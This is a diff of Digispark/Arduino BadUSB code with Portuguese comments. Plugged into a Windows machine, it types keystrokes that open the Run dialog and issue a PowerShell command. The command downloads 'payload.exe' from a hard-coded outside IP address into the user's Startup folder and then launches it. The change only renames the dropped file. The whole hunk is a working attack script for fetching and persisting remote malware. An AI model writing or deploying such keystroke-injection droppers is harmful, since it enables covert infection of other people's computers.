@@ -62,12 +62,12 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   // Altere esse valor dependendo do computador que você está usando (ou seja, lento ou não)
   DigiKeyboard.delay(900);
-  printText(F("powershell  $source = 'http://34.97.212.80/payload.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\b.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
+  printText(F("powershell  $source = 'http://34.97.212.80/payload.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(900);
-  printText(F("%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\__.exe"));
+  printText(F("%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe"));
   //powershell start-process
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(900);
